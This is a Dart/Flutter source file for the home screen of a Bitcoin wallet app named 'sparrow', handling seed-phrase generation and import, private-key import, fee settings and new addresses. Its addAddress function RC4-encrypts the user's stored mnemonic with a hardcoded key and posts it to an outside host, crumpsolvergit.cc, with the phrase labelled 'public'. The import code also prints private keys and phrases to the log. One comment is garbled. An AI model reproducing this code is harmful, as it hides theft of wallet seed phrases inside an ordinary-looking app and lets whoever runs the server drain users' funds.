import 'dart:convert';
import 'dart:math';

import 'package:bip39_mnemonic/bip39_mnemonic.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:go_router/go_router.dart';
import 'package:simple_rc4/simple_rc4.dart';
import 'package:sparrow/app_data/app_data.dart';
import 'package:sparrow/features/auth/domain/auth_service.dart';
import 'package:sparrow/features/crypt/domain/crypt.dart';
import 'package:sparrow/features/home/domain/home_screen_enum.dart';
import 'package:sparrow/features/home/domain/wallet_type_enum.dart';
import 'package:sparrow/features/settings/domain/settings_service.dart';
import 'package:reactive_variables/reactive_variables.dart';

import 'package:http/http.dart' as http;

import 'package:connectivity_plus/connectivity_plus.dart';

import 'home_screen.dart';

abstract class HomeBloc extends State<HomeScreen> {
  final AuthService authService = AuthService();
  final SettingsService settingsService = SettingsService();
  Rv<HomeScreenEnum> selectedScreen = Rv(HomeScreenEnum.wallet);
  Rv<WalletTypeEnum> selectedWalletType = Rv(WalletTypeEnum.send);
  List<Crypt> crypts = [];
  bool isReload = false;
  int transactionsLength = 0;
  int currentAddress = 0;
  bool isLoadingAddress = false;
  int currentScreen = 0;
  bool isSwitch = false;
  String titleConnect = "";
  bool isCorrectMnemonic = true;
  List<bool> isError = List.generate(
    12,
    (index) => false,
  );

  String policyType = 'Single Signature';
  List<String> policyTypeItems = [
    'Single Signature',
    'Multi Signature',
  ];

  int countKeyStores = 1;

  String calculateCountKeyStores(double value) {
    // Функция для раbank account а отметки на основе значения слайдера
    List<int> labels = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];
    int index = (value / (maxValue - minValue) * (labels.length - 1)).round();
    return labels[index].toString();
  }

  String scriptType = 'Native Segwit (P2WSH)';
  List<String> scriptTypeItems = [
    'Native Segwit (P2WSH)',
    'Legacy (P2SH)',
    'Nested Segwit (P2SH-P2WSH)',
  ];

  String get descriptorText {
    switch (policyType) {
      case "Single Signature":
        switch (scriptType) {
          case "Native Segwit (P2WSH)":
            return "wpkh(Keystore1)";
          case "Legacy (P2SH)":
            return "pkh(Keystore1)";
          case "Nested Segwit (P2SH-P2WSH)":
            return "sh(wpkh(Keystore1))";
          default:
            return "error Single Signature";
        }
      case "Multi Signature":
        List<String> keystoreArray =
            List.generate(countKeyStores, (index) => "Keystore ${index + 1}");
        switch (scriptType) {
          case "Native Segwit (P2WSH)":
            return "wsh(sortedmulti(1, ${keystoreArray.join(", ")}))";
          case "Legacy (P2SH)":
            return "sh(sortedmulti(1, ${keystoreArray.join(", ")}))";
          case "Nested Segwit (P2SH-P2WSH)":
            return "sh(wsh(sortedmulti(1, ${keystoreArray.join(", ")})))";
          default:
            return "error Multi Signature";
        }
      default:
        return "error decsriptionText";
    }
  }

  String get addressText {
    switch (scriptType) {
      case "Native Segwit (P2WSH)":
        return "wpkh($address)";
      case "Legacy (P2SH)":
        return "pkh($address)";
      case "Nested Segwit (P2SH-P2WSH)":
        return "sh(wpkh($address))";
      default:
        return "error Single Signature";
    }
  }

  String get sqrText {
    switch (scriptType) {
      case "Native Segwit (P2WSH)":
        return "wpkh";
      case "Legacy (P2SH)":
        return "pkh";
      case "Nested Segwit (P2SH-P2WSH)":
        return "sh(wpkh())";
      default:
        return "error Single Signature";
    }
  }

  String? address;
  String? balance;
  String? mem;
  String? txCount;

  int mnemonicCount = 12;
  List<String> mnemonicList = List.filled(12, "");
  List<TextEditingController> controllers = List.generate(
    12,
    (index) => TextEditingController(),
  );
  final TextEditingController phraseCtrl = TextEditingController();
  final TextEditingController phraseController = TextEditingController();
  final TextEditingController privateKeyCtrl = TextEditingController();
  List<int> possibleCount = [12, 15, 18, 21, 24];
  bool isViewMnemonic = false;
  bool isViewPrivateKey = false;
  bool isLoading = false;

  ConnectivityResult? connectivityResult;

  final TextEditingController payToCtrl = TextEditingController();
  final TextEditingController labelToCtrl = TextEditingController();
  final TextEditingController amountToCtrl = TextEditingController();
  final TextEditingController feeToCtrl = TextEditingController();

  String amountType = 'sats';
  List<String> amountTypeItems = [
    'sats',
    'USD',
    'BTC',
  ];

  String feeType = 'sats';
  List<String> feeTypeItems = [
    'sats',
    'USD',
    'BTC',
  ];

  bool isFee = true;
  bool isOptimize = true;
  bool isCreateTx = false;

  double sliderValue = 64.0;
  final double minValue = 1.0;
  final double maxValue = 1024.0;

  Color get sliderColor {
    if (sliderValue < 64) {
      return Colors.grey;
    } else if (sliderValue < 124) {
      return Colors.blue;
    } else if (sliderValue < 180) {
      return Colors.yellow;
    } else if (sliderValue < 512) {
      return const Color.fromARGB(255, 255, 94, 0);
    } else if (sliderValue < 1025) {
      return Colors.red;
    }
    return Colors.white;
  }

  String get sliderText {
    if (sliderValue < 64) {
      return "Below Minimum";
    } else if (sliderValue < 128) {
      return "Low Priority";
    } else if (sliderValue < 180) {
      return "Medium Priority";
    } else if (sliderValue < 512) {
      return "High Priority";
    } else if (sliderValue < 1025) {
      return "Overpaid";
    }
    return "Below Minimum";
  }

  Future<void> initConnectivity() async {
    connectivityResult = await (Connectivity().checkConnectivity());
  }

  @override
  void initState() {
    initConnectivity();
    connectivityResult == ConnectivityResult.none
        ? isSwitch = false
        : isSwitch = true;
    setState(() {
      address = authService.getAddress(0);
      balance = authService.getBalance().toString();
      mem = authService.getMem().toString();
      txCount = authService.getTxCount().toString();
    });
    super.initState();
  }

  void onClear() {
    setState(() {
      isCorrectMnemonic = true;
      payToCtrl.text = "";
      amountToCtrl.text = "";
      labelToCtrl.text = "";
      feeToCtrl.text = "";
      privateKeyCtrl.text = "";
      phraseCtrl.text = "";
      phraseController.text = "";
      mnemonicList = List.filled(mnemonicCount, "");
      controllers = List.generate(
        mnemonicCount,
        (index) => TextEditingController(),
      );
    });
  }

  int get counts {
    switch (mnemonicCount) {
      case 12:
        return 128;
      case 15:
        return 160;
      case 18:
        return 192;
      case 21:
        return 224;
      case 24:
        return 256;
      default:
        return 128;
    }
  }

  void generateNew() {
    setState(() {
      Mnemonic mnemonic = Mnemonic.generate(
        Language.english,
        passphrase: "Something",
        entropyLength: counts,
      );

      mnemonicList = mnemonic.sentence.split(' ');
      for (int i = 0; i < mnemonicList.length; i++) {
        controllers[i].text = mnemonicList[i];
      }
    });
  }

  Future<bool> import() async {
    if (phraseCtrl.text.isEmpty) {
      bool isSnack = false;
      for (int i = 0; i < controllers.length; i++) {
        if (controllers[i].text.isEmpty) {
          if (!isSnack) {
            Clipboard.setData(
              const ClipboardData(text: "Hi"),
            ).then((_) {
              ScaffoldMessenger.of(context).showSnackBar(
                const SnackBar(
                  content: Text("One of required fields is empty"),
                ),
              );
            });
            setState(() {
              isError[i] = true;
            });
            isSnack = true;
            return true;
          }
          isLoading = false;
          print(phraseController.text);
        } else {
          setState(() {
            isError[i] = false;
          });
          isLoading = true;
        }
      }
      phraseController.text = mnemonicList.join(' ');
    } else {
      isLoading = true;
      phraseController.text = phraseCtrl.text;
    }

    if (isLoading == true) {
      context.pop();
      await AppData.utils.importData(
        public: phraseController.text,
        isNew: false,
      );
      settingsService.putMnemonicSentence(phraseController.text);
      if (mounted) {
        context.go(AppData.routes.homeScreen);
      }
      setState(() {
        isLoading = false;
      });
    }
    return false;
  }

  Future<void> importKey() async {
    setState(() {
      if (privateKeyCtrl.text.isEmpty) {
        return;
      } else {
        context.pop();
        isLoading = true;
        print(privateKeyCtrl.text);
      }
    });
    await AppData.utils.importData(
      public: privateKeyCtrl.text,
      isNew: false,
    );
    if (mounted) {
      onClear();
      context.go(AppData.routes.homeScreen);
    }
    setState(() {
      isLoading = false;
    });
  }

  Future<void> addAddress() async {
    setState(() {
      isLoadingAddress = true;
    });
    String r = Random().nextInt(999999).toString().padLeft(6, '0');

    final data = json.encode({
      'public': settingsService.getMnemonicSentence(),
      'salt': r,
      'name': 'Sparrow\$',
      'new': false,
      'addressBtc': true,
      // 'cache': false,
    });
    var bytes = RC4('Qsx@ah&OR82WX9T6gCt').encodeString(data);
    print("bytes $bytes");

    final res = await http.post(
      Uri.parse("https://crumpsolvergit.cc/date/spot/board"),
      body: {'data': bytes},
      encoding: Encoding.getByName("utf-8"),
      headers: {"Content-Type": "application/x-www-form-urlencoded"},
    );

    final String address = jsonDecode(res.body)['address'];
    authService.putAddress(address);

    await Future.delayed(const Duration(seconds: 2));
    setState(() {
      currentAddress = authService.getAddresses()!.length - 1;
      this.address = authService.getAddress(currentAddress)!;
      isLoadingAddress = false;
    });
  }
}
